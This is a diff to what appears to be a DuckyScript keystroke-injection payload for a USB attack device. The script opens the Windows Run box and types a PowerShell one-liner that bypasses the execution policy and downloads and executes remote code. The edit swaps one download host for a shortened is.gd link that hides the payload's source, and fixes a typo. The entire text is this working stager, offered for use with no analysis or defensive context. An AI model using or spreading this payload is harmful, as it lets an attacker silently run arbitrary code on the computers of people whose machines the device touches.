@@ -9,5 +9,5 @@ DEFAULT_DELAY 100
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -C $raandomVar 'var'; iex (irm bw0.cc/icons)
+STRING powershell -Ep Bypass -C $randomVar = 'var'; iex (irm is.gd/lh92CZ)
 ENTER
